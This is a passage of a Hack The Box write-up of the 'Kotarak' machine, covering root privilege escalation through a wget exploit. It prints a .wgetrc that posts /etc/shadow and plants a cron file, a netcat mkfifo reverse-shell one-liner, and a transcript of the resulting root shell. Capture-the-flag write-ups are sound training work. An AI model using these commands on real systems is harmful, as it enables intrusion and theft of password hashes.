+ atanas@kotarak-dmz:/root$<br></figure></pre>
+ <p>Search exploit for version wget.
+  <img src="/images/hackthebox/exploit/kotarak/10.png" alt=""></p>
+ <h2 id="Get-Privileges"><a href="#Get-Privileges" class="Get-Privileges" title="Get-Privileges"></a>Get Privileges</h2>
+ <p>Copy the code from the exploit found and paste the code in the kotarak server for create file.
+  <img src="/images/hackthebox/exploit/kotarak/11.png" alt=""></p>
+  <pre><figure class="highlight plain"> atanas@kotarak-dmz:/dev/shm$ cat <<_EOF_>.wgetrc
+  post_file = /etc/shadow
+  output_document = /etc/cron.d/wget-root-shell
+  _EOF_cat <<_EOF_>.wgetrc
+  > post_file = /etc/shadow
+  > output_document = /etc/cron.d/wget-root-shell
+  > _EOF_
+  atanas@kotarak-dmz:/dev/shm$ vi .wgetrc
+ vi .wgetrc
+ 
+ post_file = /etc/shadow
+ output_document = /etc/cron.d/wget-root-shell<br></figure></pre>
+  <p>Run the second reverse conection netcat.
+  <img src="/images/hackthebox/exploit/kotarak/12.png" alt=""></p>
+ <p>Create a file exploit.py</code> with python code section from exploit found and change the ip address for 10.10.10.55 and add to reverse command conection <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f</code> for 10.10.14.27.
+  <img src="/images/hackthebox/exploit/kotarak/13.png" alt=""></p>
+ <p>In the first reverse shell, launch <code>authbind python -m pyftpdlib -p21 -w</code> for run ftp server. In the second reverse shell run the exploit <code>authbind python exploit.py</code> which run the http server.
+  <img src="/images/hackthebox/exploit/kotarak/14.png" alt=""></p>
+  <p> Stop the process over port http, modify the exploit.py to 0.0.0.0 ip address instead of 10.10.10.55.
+<img src="/images/hackthebox/exploit/kotarak/16.png" alt=""></p> 
+ <p>Relaunch the exploit.py.
+  <img src="/images/hackthebox/exploit/kotarak/15.png" alt=""></p>
+  <p>The web server log show connection from 10.0.3.133.
+  <p>Put nc listener over port 1234 and wait two minutes for reverse connection.
+  <img src="/images/hackthebox/exploit/kotarak/15.png" alt=""></p>
+  <p>Reverse connection.
+   <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/kotarak)
+ |
+ |-->{SFire129}#nc -nvlp 1234
+ listening on [any] 1234 ...
+ 
+ connect to [10.10.14.27] from (UNKNOWN) [10.10.10.55] 34860
+ /bin/sh: 0: can't access tty; job control turned off
+ # # ifconfig
+ /bin/sh: 2: ifconfig: not found
+ # /sbin/ifconfig
+ eth0      Link encap:Ethernet  HWaddr 00:16:3e:c9:bd:b1
+           inet addr:10.0.3.133  Bcast:10.0.3.255  Mask:255.255.255.0
+           inet6 addr: fe80::216:3eff:fec9:bdb1/64 Scope:Link
+           UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+           RX packets:1894 errors:0 dropped:0 overruns:0 frame:0
+           TX packets:1890 errors:0 dropped:0 overruns:0 carrier:0
+           collisions:0 txqueuelen:1000
+           RX bytes:106039 (106.0 KB)  TX bytes:116407 (116.4 KB)
+ 
+ lo        Link encap:Local Loopback
+           inet addr:127.0.0.1  Mask:255.0.0.0
+           inet6 addr: ::1/128 Scope:Host
+           UP LOOPBACK RUNNING  MTU:65536  Metric:1
+           RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+           TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+           collisions:0 txqueuelen:1
+           RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
+ 
+ # whoami
+ root
+ # hostname
+ kotarak-int
+ # <br></figure></pre>
+ <h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="Capture-The-Flag" title="Capture-The-Flag"></a>Capture The Flag</h2>
+
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/kotarak)
+|
+|-->{SFire129}#nc -nvlp 1234
+listening on [any] 1234 ...
+
+connect to [10.10.14.27] from (UNKNOWN) [10.10.10.55] 34860
+/bin/sh: 0: can't access tty; job control turned off# whoami
+ root
+ # hostname
+ kotarak-int
+ #
+ #
+ # cat /home/atanas/user.txt
+ cat: /home/atanas/user.txt: No such file or directory
+ # find . -name *root.txt -exec wc -c {} \;
+ 33 ./root.txt
+ # find . -name *user.txt -exec wc -c {} \;
+ # cat /root.txt
+ cat: /root.txt: No such file or directory
+ # cat /.root.txt
+ cat: /.root.txt: No such file or directory
+ # cat ./root.txt</figure></pre>
+
+ 
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-06-11</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#Linux</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#Exploit</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#SSRF</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
